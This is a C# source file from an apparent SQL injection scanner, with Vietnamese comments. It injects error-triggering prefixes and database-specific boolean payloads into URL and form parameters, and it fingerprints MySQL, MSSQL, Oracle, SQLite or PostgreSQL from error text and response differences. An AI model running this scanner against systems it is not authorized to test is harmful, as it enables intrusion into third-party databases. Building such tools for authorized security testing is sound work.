using SQLiScanner.Utility;
using System;
using System.Collections.Generic;
using System.Data;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace SQLiScanner
{
    public class DatabaseDetector
    {
        private readonly HttpClient _client;
        private readonly Lazy<Dictionary<DbType, string[]>> _databasePayloads;
        private readonly Lazy<Dictionary<DbType, List<KeywordValueByScore>>> _errorPatterns;
        public DatabaseDetector(HttpClient client)
        {
            _client = client;
            _databasePayloads = new(() => InitializeDatabasePayloads());
            _errorPatterns = new(() => InitializeErrorPatterns());
        }

        public async Task<DetectionResult> DetectAsync(CrawlResult target)
        {
            Logger.Url(
                target.FullUrl,
                target.HttpMethod,
                string.Join(", ", target.Params.Keys)
            );
            foreach (var param in target.Params)
            {
                string paramName = param.Key;
                string originalValue = param.Value;
                Logger.Info($"ĐỐI TƯỢNG THAM SỐ ĐỂ CHÈN PAYLOAD: {paramName}");

                Logger.Process("Lấy thông tin từ URL nguyên bản trước khi chèn Payload...");
                (string? _, byte[]? baseBytes, int baseStatusCode) = 
                    await SendRequestAsync(target, paramName, originalValue);
                int baseLength = baseBytes?.Length ?? 0;
                Logger.Response(baseStatusCode, baseLength);

                if (baseBytes == null)
                {
                    Logger.Error("KHÔNG NHẬN ĐƯỢC PHẢN HỒI!");
                    continue;
                }

                List<string> prefixes = GetPossiblePrefixes(originalValue);

                foreach (string prefix in prefixes)
                {
                    // --- GIAI ĐOẠN 1: Error-Based DETECTION ---
                    Logger.Phase($"TÌM KIẾM BẰNG ERROR-BASED VỚI PREFIX [{prefix}]");
                    
                    // Tạo payload gây lỗi (VD: 1')
                    string errorPayload = originalValue + prefix;

                    Logger.Process($"[>] Chèn {paramName}={errorPayload}");
                    (string? responseHtml, _, int errorCode) = await SendRequestAsync(target, paramName, errorPayload);
                    Logger.Response(errorCode);

                    if (string.IsNullOrEmpty(responseHtml))
                    {
                        Logger.Warning("KHÔNG NHẬN ĐƯỢC PHẢN HỒI!");
                        continue;
                    }

                    // Kiểm tra html response có chứa các từ khóa để nhận diện database không
                    var dbType = AnalyzeErrorBasedText(responseHtml);

                    if (dbType != DbType.Unknow)
                    {
                        DetectionResult result = new DetectionResult
                        {
                            DatabaseType = dbType,
                            VulnerableParam = paramName,
                            WorkingPrefix = prefix
                        };

                        Logger.Success($"PHÁT HIỆN {dbType} THÔNG QUA THÔNG BÁO LỖI!");
                        Logger.Result(result);
                        return result;
                    }

                    Logger.Warning("Không thể sử dụng Error-Based để xác định Database!");

                    // --- GIAI ĐOẠN 2: BOOLEAN/BLIND DETECTION (Nếu không thấy lỗi text) ---
                    Logger.Phase($"TÌM KIẾM BẰNG BOOLEAN-BASED VỚI PREFIX [{prefix}]");
                    if (baseLength > 0)
                    {
                        // Thử với từng loại DB để xem cái nào trả về True (Length không đổi)
                        var blindResult = await DetectBlindSqlAsync(
                                                    target,
                                                    paramName, 
                                                    originalValue, 
                                                    prefix,
                                                    baseLength, 
                                                    baseStatusCode);
                        if (blindResult.DatabaseType != DbType.Unknow)
                        {
                            Logger.Result(blindResult);
                            return blindResult;
                        }
                    }
                    else
                    {
                        Logger.Skipped("Không nhận được phản hồi web. Vui lòng kiểm tra kết nối!");
                    }
                }
            }

            Logger.Skipped("Không tìm thấy được lỗ hổng SQLi trong tất cả các Entry points!");
            return new DetectionResult();
        }

        private async Task<DetectionResult> DetectBlindSqlAsync(
            CrawlResult target, 
            string paramName,
            string originalValue,
            string prefix,
            int baseLength,
            int baseStatusCode)
        {
            var payload = _databasePayloads.Value;

            if (await TestBooleanPayload(
                target, paramName, originalValue, prefix,
                payload[DbType.MySQL], DbType.MySQL, baseLength, baseStatusCode))
            {
                Logger.Success($"Phát hiện {DbType.MySQL} thông qua Boolean-Based!");
                return new DetectionResult
                {
                    DatabaseType = DbType.MySQL,
                    VulnerableParam = paramName,
                    WorkingPrefix = prefix
                }; 
            }

            Logger.Warning("Payload của MySQL không hiệu quả!");
            Logger.Process("Chuyển sang sử dụng Payload của MSSQL...");

            if (await TestBooleanPayload(
                target, paramName, originalValue, prefix,
                payload[DbType.MSSQL], DbType.MSSQL, baseLength, baseStatusCode))
            {
                Logger.Success($"Phát hiện {DbType.MSSQL} thông qua Boolean-Based!");
                return new DetectionResult
                {
                    DatabaseType = DbType.MSSQL,
                    VulnerableParam = paramName,
                    WorkingPrefix = prefix
                }; 
            }

            Logger.Warning($"Payload của MSSQL không hiệu quả!");
            Logger.Process("Chuyển sang sử dụng Payload của Oracle...");

            if (await TestBooleanPayload(
                target, paramName, originalValue, prefix,
                payload[DbType.Oracle], DbType.Oracle, baseLength, baseStatusCode))
            {
                Logger.Success($"Phát hiện {DbType.Oracle} thông qua Boolean-Based!");
                return new DetectionResult
                {
                    DatabaseType = DbType.Oracle,
                    VulnerableParam = paramName,
                    WorkingPrefix = prefix
                }; 
            }

            Logger.Warning($"Payload của Oracle không hiệu quả!");
            Logger.Process("Chuyển sang sử dụng Payload của SQLite...");

            if (await TestBooleanPayload(
                target, paramName, originalValue, prefix,
                payload[DbType.SQLite], DbType.SQLite, baseLength, baseStatusCode))
            {
                Logger.Success($"Phát hiện {DbType.SQLite} thông qua Boolean-Based!");
                return new DetectionResult
                {
                    DatabaseType = DbType.SQLite,
                    VulnerableParam = paramName,
                    WorkingPrefix = prefix
                }; 
            }

            Logger.Warning($"Payload của SQLite không hiệu quả!");
            Logger.Process("Chuyển sang sử dụng Payload của PostgreSQL...");

            if (await TestBooleanPayload(
                target, paramName, originalValue, prefix,
                payload[DbType.PostgreSQL], DbType.PostgreSQL, baseLength, baseStatusCode))
            {
                Logger.Success($"Phát hiện {DbType.PostgreSQL} thông qua Boolean-Based!");
                return new DetectionResult
                {
                    DatabaseType = DbType.PostgreSQL,
                    VulnerableParam = paramName,
                    WorkingPrefix = prefix
                }; 
            }
            Logger.Warning($"Payload của PostgreSQL không hiệu quả!");

            return new DetectionResult { DatabaseType = DbType.Unknow };
        }

        #region Các hàm phụ trợ
        private async Task<(string? html, byte[]? bytes, int statusCode)> SendRequestAsync(CrawlResult target, string injectKey, string injectValue)
        {
            try
            {
                var checkParams = new Dictionary<string, string>(target.Params);
                checkParams[injectKey] = injectValue;

                var method = new HttpMethod(target.HttpMethod.ToUpper());

                HttpRequestMessage request;

                if (method == HttpMethod.Get)
                {
                    var uriBuilder = new UriBuilder(target.FullUrl);
                    var query = System.Web.HttpUtility.ParseQueryString(string.Empty);
                    foreach (var p in checkParams) query[p.Key] = p.Value;
                    uriBuilder.Query = query.ToString();

                    request = new HttpRequestMessage(method, uriBuilder.ToString());
                    Logger.Request(method.ToString(), request.RequestUri.ToString());
                    
                }
                else // POST
                {
                    request = new HttpRequestMessage(method, target.FullUrl);
                    request.Content = new FormUrlEncodedContent(checkParams);
                    Logger.Process($"[>] Đang gửi Form cùng các truòng dữ liệu đính kèm...");
                    Logger.Request(method.ToString(), string.Join(", ", checkParams.Select(kv => $"{kv.Key} = [{kv.Value}]")));
                }

                if (!request.Headers.Contains("User-Agent"))
                {
                    request.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                }

                using var response = await _client.SendAsync(request, HttpCompletionOption.ResponseContentRead);
                var bytes = await response.Content.ReadAsByteArrayAsync();
                var charset = response.Content.Headers.ContentType?.CharSet;
                var encoding = (charset is not null) ? Encoding.GetEncoding(charset) : Encoding.UTF8;

                return (encoding.GetString(bytes), bytes, (int)response.StatusCode);
            }
            catch (Exception ex)
            {
                Logger.Error($"Gửi Request thất bại: {ex.Message}");
                return (null, null, 0);
            }
        }

        private async Task<bool> TestBooleanPayload(
            CrawlResult target,
            string paramName,
            string originalValue,
            string prefix,
            string[] payloads,
            DbType dbType,
            int baseLength,
            int baseStatusCode)
        {
            string comment = GetCommentSymbol(dbType);
            foreach (var payload in payloads)
            {
                Logger.Process($"Kiểm tra {dbType} với payload: {payload}...");
                // CHUẨN BỊ PAYLOAD

                string fullPayloadTrue = $"{originalValue}{prefix} AND {payload} {comment}";

                string falsePayload = payload.Replace("=", "!=").Replace(">", "<");
                string fullPayloadFalse = $"{originalValue}{prefix} AND {falsePayload} {comment}";

                Logger.Process($"[>] TRUE PayLoad {fullPayloadTrue}");
                (string? htmlTrue, byte[]? bytesTrue, int statusTrue) = await SendRequestAsync(target, paramName, fullPayloadTrue);
                if (bytesTrue == null)
                {
                    Logger.Warning("Mất kết nối hoặc bị WAF chặn. Bỏ qua.");
                    return false;
                }
                Logger.Response(statusTrue, bytesTrue.Length);

                Logger.Process($"[>] FALSE Payload {fullPayloadFalse}");
                (string? htmlFalse, byte[]? bytesFalse, int statusFalse) = await SendRequestAsync(target, paramName, fullPayloadFalse);

                if (bytesFalse == null)
                {
                    Logger.Warning("Mất kết nối hoặc bị WAF chặn. Bỏ qua.");
                    return false;
                }
                Logger.Response(statusFalse, bytesFalse.Length);

                // ĐẢM BẢO 2 PHẢN HỒI TỪ PAYLOAD KHÔNG GIỐNG NHAU
                if (statusTrue != statusFalse)
                {
                    Logger.Success($"Phát hiện khác biệt Status Code: True({statusTrue}) != False({statusFalse})");
                    return true;
                }

                if (IsSimilar(bytesTrue.Length, bytesFalse.Length, 0.05))
                {
                    Logger.Warning($"Phát hiện sự trùng nhau ở dung lượng cả 2. True({bytesTrue.Length}) ~ False({bytesFalse.Length})");
                    return false;
                }

                //BÁO CÁO PHÁT HIỆN TRƯỜNG HỢP ĐẶC BIỆT KHI MÃ PHẢN HỒI CẢ 2 GIỐNG NHAU NHƯNG DUNG LƯỢNG CẢ 2 LẠI KHÁC.
                if (IsSimilar(baseLength, bytesTrue.Length, 0.05))
                {
                    Logger.Success("Kịch bản phát hiện: Base giống True, nhưng khác False.");
                }
                else if (IsSimilar(baseLength, bytesFalse.Length, 0.05))
                {
                    Logger.Success("Kịch bản phát hiện (Bypass/Login): Base giống False, nhưng True lại ra kết quả mới.");
                }
                else
                {
                    Logger.Success("Kịch bản phát hiện: Cả True và False đều làm thay đổi trang web so với Base.");
                }

                return true;
            }

            //Để đây để không bị lỗi cú pháp
            return false;
        }

        private DbType AnalyzeErrorBasedText(string html)
        {
            if (string.IsNullOrEmpty(html)) return DbType.Unknow;

            var patterns = _errorPatterns.Value;
            //Dùng Tuple để chứa điểm của từng
            var bestMatch = (DbType: (DbType?)null, TotalScore: 0);

            Logger.Process($"Phân tích nội dung phản hồi...");
            foreach (var pattern in patterns)
            {
                int patternScore = 0;
                List<string> matchedKeywords = new List<string>();
                
                // Kiểm tra từng Keyword
                foreach (KeywordValueByScore keywordMatch in pattern.Value) 
                {
                    if (html.Contains(keywordMatch.Keyword, StringComparison.OrdinalIgnoreCase))
                    {
                        patternScore += keywordMatch.Score;
                        matchedKeywords.Add(keywordMatch.Keyword);
                    }
                }

                // TRƯỜNG HỢP ĐẶC BIỆT: Các cú pháp lỗi của ORACLE đều chứa kí tự ORA-. Skip nếu không thấy
                if (pattern.Key == DbType.Oracle && !html.Contains("ORA-", StringComparison.OrdinalIgnoreCase))
                {
                    patternScore = 0;
                }

                if (patternScore > bestMatch.TotalScore)
                {
                    bestMatch = (pattern.Key, patternScore);
                    Logger.Info($"Database: {pattern.Key} (Điểm: {patternScore}) " +
                                $"Với các từ khóa được tìm thấy: {string.Join(", ", matchedKeywords)}");
                }

                Logger.Info($"Database: {pattern.Key} (Điểm: {patternScore})");
            }

            // Xác định điểm tối thiểu cần phải đạt để xác nhận Database
            if (bestMatch.DbType != null && bestMatch.TotalScore >= 8)
            {
                Logger.Success($"Error-Based phát hiện Database: {bestMatch.DbType} " +
                       $"(Điểm: {bestMatch.TotalScore}/10)");

                return (DbType)bestMatch.DbType;
            }

            return DbType.Unknow;
        }

        private List<string> GetPossiblePrefixes(string value)
        {
            var list = new List<string>();
            bool isNumeric = long.TryParse(value, out _);
            if (isNumeric) 
            {
                list.Add(""); 
                list.Add("'"); 
                list.Add("\""); 
            }
            else
            { 
                list.Add("'"); 
                list.Add("\""); 
                list.Add(""); 
            }
            list.Add(")"); 
            list.Add("')");
            return list;
        }

        private bool IsSimilar(int baseLength, int newLength, double tolerancePercent)
        {
            int diff = Math.Abs(newLength - baseLength);
            return diff <= (baseLength * tolerancePercent);
        }

        private Dictionary<DbType, string[]> InitializeDatabasePayloads()
        {
            return new Dictionary<DbType, string[]>
            {
                {DbType.MySQL, new string[]{
                    "conv('a',16,2)=conv('a',16,2)",
                    "connection_id()=connection_id()",
                    "crc32('MySQL')=crc32('MySQL')" 
                }},

                {DbType.MSSQL, new string[] {
                    "@@CPU_BUSY=@@CPU_BUSY",
                    "@@CONNECTIONS=@@CONNECTIONS",
                    "BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)" 
                }},

                {DbType.PostgreSQL, new string[] { 
                    "5::integer=5",
                    "pg_client_encoding()=pg_client_encoding()",
                    "current_database()=current_database()"
                }},

                {DbType.Oracle, new string[] {
                    "ROWNUM=ROWNUM",
                    "LNNVL(0=123)",
                    "RAWTOHEX('AB')=RAWTOHEX('AB')"
                }},

                {DbType.SQLite, new string[] {
                    "sqlite_version()=sqlite_version()",
                    "last_insert_rowid()>1"
                }},
            };
        }

        private record KeywordValueByScore(string Keyword, int Score);
        private Dictionary<DbType, List<KeywordValueByScore>> InitializeErrorPatterns()
        {
            return new Dictionary<DbType, List<KeywordValueByScore>>()
            {
                [DbType.MySQL] = new()
                {
                    new ("MySQL", 10),
                    new ("MariaDB", 10),
                    new ("syntax error", 8),
                    new ("near", 7),
                    new ("at line", 6)
                },

                [DbType.MSSQL] = new()
                {
                    new ("Unclosed quotation mark", 10),
                    new ("Incorrect syntax near", 9),
                    new ("SQL Server", 10),
                    new ("ODBC", 8),
                    new ("state", 7)
                },

                [DbType.PostgreSQL] = new()
                {
                    new ("unterminated quoted string", 10),
                    new ("ERROR:", 9),
                    new ("PostgreSQL", 10),
                    new ("syntax error at or near", 9),
                    new ("at or near", 7)
                }, 

                [DbType.Oracle] = new()
                {
                    new ("ORA-", 10),
                    new ("ORA-00933", 10),
                    new ("ORA-01756", 10),
                    new ("ORA-00923", 10),
                    new ("Oracle", 9)
                },

                [DbType.SQLite] = new()
                {
                    new ("SQLite", 10),
                    new ("database disk image is malformed", 9),
                    new ("near", 5)
                }
            };
        }

        private string GetCommentSymbol(DbType dbType)
        {
            if (dbType == DbType.MySQL) return " %23";
            return " -- ";
        }
        #endregion
    }
}